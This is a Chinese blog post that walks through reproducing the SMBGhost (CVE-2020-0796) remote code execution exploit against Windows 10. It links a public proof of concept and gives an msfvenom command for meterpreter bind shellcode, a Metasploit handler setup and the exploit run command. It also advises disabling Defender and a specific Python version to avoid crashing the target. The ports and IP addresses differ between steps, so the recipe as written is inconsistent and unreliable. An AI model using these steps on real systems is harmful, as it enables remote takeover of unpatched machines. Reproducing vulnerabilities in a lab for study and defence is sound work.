## 漏洞介绍

微软SMBv3 Client/Server远程代码执行漏洞CVE-2020-0796

影响范围：  
Windows 10 Version 1903 for 32-bit Systems  
Windows 10 Version 1903 for x64-based Systems  
Windows 10 Version 1903 for ARM64-based Systems  
Windows Server, Version 1903 (Server Core installation)  
Windows 10 Version 1909 for 32-bit Systems  
Windows 10 Version 1909 for x64-based Systems  
Windows 10 Version 1909 for ARM64-based Systems  
Windows Server, Version 1909 (Server Core installation)

 **复现坑点：坑点比较多看一下**

EXP地址：

https://github.com/chompie1337/SMBGhost_RCE_PoC

  * Win10 版本有限制，具体我自己用的下面这个成功的

下载地址

  * python 版本

python 3.6 可以成功！

python 3.6 可以成功！

python 3.7 和 2 实测蓝屏

不懂为啥，有大佬知道可以指导一下弟弟

  * payload要正向监听

  * 补丁也有坑，KB4551762讲道理是没有，但是win10的补丁，看见就那几个，但是那个补丁里面可能有包含这个补丁

  * 需要关闭defender防火墙

# 复现过程

首先使用systeminfo看一下补丁（KB4551762）

我新装的，肯定没啥问题，

  * msf生成木马

    
    
    msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -b '\x00' -i 1 -f python
    

![](https://image.3001.net/images/20201103/1604385586_5fa0fb323b78e2500f0d8.png!small)

EXP替换shellcode

把buf 替换成USER_PAYLOAD

![](https://image.3001.net/images/20201103/1604385604_5fa0fb44de6937a3f4856.png!small)

    
    
    use exploit/multi/handler 
    set payload windows/x64/meterpreter/bind_tcp
    set lport 6666
    set rhost 192.168.31.235
    run
    

![](https://image.3001.net/images/20201103/1604385638_5fa0fb66f31090905705c.png!small)![](https://image.3001.net/images/20201103/1604385646_5fa0fb6e5a9d0ff0fa33c.png!small)运行EXP

    
    
    python3 exploit.py -ip 192.168.100.54
    

![](https://image.3001.net/images/20201103/1604385685_5fa0fb951c9ec64751af6.png!small)最终拿到shell

![](https://image.3001.net/images/20201103/1604385700_5fa0fba42e15162d3be4e.png!small)
**免责声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。禁止任何人转载到其他站点，禁止用于任何非法用途。如有任何人凭此做何非法事情，均于笔者无关，特此声明。**

